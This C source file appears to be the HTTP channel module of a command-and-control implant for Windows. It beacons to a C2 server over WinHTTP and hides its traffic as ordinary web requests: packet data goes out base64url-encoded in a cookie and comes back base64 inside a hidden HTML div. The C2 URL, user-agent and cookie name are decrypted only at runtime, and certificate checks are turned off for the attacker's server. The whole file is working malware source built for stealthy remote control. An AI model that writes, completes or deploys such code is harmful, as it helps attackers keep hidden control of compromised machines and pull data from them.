/*
 * channel.c — HTTP channel via WinHTTP.
 * Sends C2 data as base64url in a cookie (per malleable profile).
 * Receives response as base64 in an HTML wrapper.
 */
#include "agent.h"

static HINTERNET g_hSession = NULL;

BOOL http_init(void) {
    g_hSession = WinHttpOpen(
        L"" /* User-Agent set per-request */,
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );
    return g_hSession != NULL;
}

void http_cleanup(void) {
    if (g_hSession) {
        WinHttpCloseHandle(g_hSession);
        g_hSession = NULL;
    }
}

/* Convert narrow string to wide string (caller frees) */
static wchar_t *to_wide(const char *s) {
    int len = MultiByteToWideChar(CP_UTF8, 0, s, -1, NULL, 0);
    wchar_t *w = (wchar_t *)malloc(len * sizeof(wchar_t));
    MultiByteToWideChar(CP_UTF8, 0, s, -1, w, len);
    return w;
}

/* ─── Profile transforms ─── */

char *profile_encode_request(const unsigned char *packet, DWORD packet_len,
                             DWORD *cookie_len) {
    /* Base64URL encode the packet for cookie embedding */
    return base64url_encode(packet, packet_len, cookie_len);
}

unsigned char *profile_decode_response(const char *body, DWORD body_len,
                                       DWORD *out_len) {
    /*
     * Response format (from default profile):
     *   <html><body><div style="display:none">\n
     *   BASE64_DATA\n
     *   </div></body></html>\n
     *
     * Find the base64 data between the wrappers.
     */
    const char *start = strstr(body, "display:none\">");
    if (!start) {
        /* Fallback: try to find base64 directly */
        start = body;
    } else {
        start += strlen("display:none\">");
        /* Skip whitespace/newlines */
        while (*start == '\n' || *start == '\r' || *start == ' ') start++;
    }

    const char *end = strstr(start, "</div>");
    if (!end) end = body + body_len;

    /* Trim trailing whitespace */
    while (end > start && (end[-1] == '\n' || end[-1] == '\r' || end[-1] == ' '))
        end--;

    DWORD b64_len = (DWORD)(end - start);
    if (b64_len == 0) {
        *out_len = 0;
        return NULL;
    }

    return base64_decode(start, b64_len, out_len);
}

/* ─── HTTP send/receive ─── */

BOOL http_send_recv(const unsigned char *packet, DWORD packet_len,
                    unsigned char **response, DWORD *response_len) {
    *response = NULL;
    *response_len = 0;

    if (!g_hSession) return FALSE;

    /* Decrypt C2 URL at runtime (never stored as plaintext in binary) */
    char c2_url_dec[512];
    DECRYPT_CONFIG(c2_url_dec, C2_URL);
    wchar_t *wUrl = to_wide(c2_url_dec);
    SecureZeroMemory(c2_url_dec, sizeof(c2_url_dec));

    URL_COMPONENTS urlComp;
    memset(&urlComp, 0, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwSchemeLength = (DWORD)-1;
    urlComp.dwHostNameLength = (DWORD)-1;
    urlComp.dwUrlPathLength = (DWORD)-1;

    if (!WinHttpCrackUrl(wUrl, 0, 0, &urlComp)) {
        free(wUrl);
        return FALSE;
    }

    /* Extract hostname */
    wchar_t hostname[256] = {0};
    wcsncpy(hostname, urlComp.lpszHostName, min(urlComp.dwHostNameLength, 255));

    /* Extract path */
    wchar_t path[512] = {0};
    if (urlComp.lpszUrlPath && urlComp.dwUrlPathLength > 0)
        wcsncpy(path, urlComp.lpszUrlPath, min(urlComp.dwUrlPathLength, 511));
    else
        wcscpy(path, L"/");

    BOOL isHttps = (urlComp.nScheme == INTERNET_SCHEME_HTTPS);
    INTERNET_PORT port = urlComp.nPort;
    if (port == 0) port = isHttps ? 443 : 80;

    /* Connect */
    HINTERNET hConnect = WinHttpConnect(g_hSession, hostname, port, 0);
    if (!hConnect) { free(wUrl); return FALSE; }

    /* Open request */
    DWORD flags = isHttps ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect, L"GET", path, NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        free(wUrl);
        return FALSE;
    }

    /* Accept self-signed certs (C2 server) */
    if (isHttps) {
        DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                         SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                         SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                         SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS,
                         &secFlags, sizeof(secFlags));
    }

    /* Decrypt and set User-Agent header */
    char ua_dec[512];
    DECRYPT_CONFIG(ua_dec, USER_AGENT);
    char ua_header[768];
    snprintf(ua_header, sizeof(ua_header), "User-Agent: %s", ua_dec);
    SecureZeroMemory(ua_dec, sizeof(ua_dec));
    wchar_t *wUA = to_wide(ua_header);
    WinHttpAddRequestHeaders(hRequest, wUA, (DWORD)-1,
                             WINHTTP_ADDREQ_FLAG_REPLACE | WINHTTP_ADDREQ_FLAG_ADD);
    free(wUA);

    /* Encode packet as base64url cookie */
    DWORD cookie_len;
    char *cookie_val = profile_encode_request(packet, packet_len, &cookie_len);
    if (cookie_val) {
        /* Build Cookie header with decrypted cookie name */
        char ck_name_dec[64];
        DECRYPT_CONFIG(ck_name_dec, COOKIE_NAME);
        char cookie_hdr[16384];
        snprintf(cookie_hdr, sizeof(cookie_hdr), "Cookie: %s=%s",
                 ck_name_dec, cookie_val);
        SecureZeroMemory(ck_name_dec, sizeof(ck_name_dec));
        wchar_t *wCookie = to_wide(cookie_hdr);
        WinHttpAddRequestHeaders(hRequest, wCookie, (DWORD)-1,
                                 WINHTTP_ADDREQ_FLAG_ADD);
        free(wCookie);
        free(cookie_val);
    }

    /* Send */
    BOOL ok = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                  WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (!ok) goto cleanup;

    /* Receive response */
    ok = WinHttpReceiveResponse(hRequest, NULL);
    if (!ok) goto cleanup;

    /* Read response body */
    Buffer resp_buf;
    buf_init(&resp_buf, 4096);

    DWORD bytes_available, bytes_read;
    do {
        bytes_available = 0;
        WinHttpQueryDataAvailable(hRequest, &bytes_available);
        if (bytes_available == 0) break;

        unsigned char *chunk = (unsigned char *)malloc(bytes_available);
        if (WinHttpReadData(hRequest, chunk, bytes_available, &bytes_read)) {
            buf_append(&resp_buf, chunk, bytes_read);
        }
        free(chunk);
    } while (bytes_available > 0);

    /* Decode response body (strip HTML wrapper, base64 decode) */
    if (resp_buf.len > 0) {
        /* Null-terminate for string operations */
        buf_append(&resp_buf, "\0", 1);
        *response = profile_decode_response((char *)resp_buf.data,
                                             resp_buf.len - 1, response_len);
    }

    buf_free(&resp_buf);
    ok = (*response != NULL && *response_len > 0);

cleanup:
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    free(wUrl);
    return ok;
}
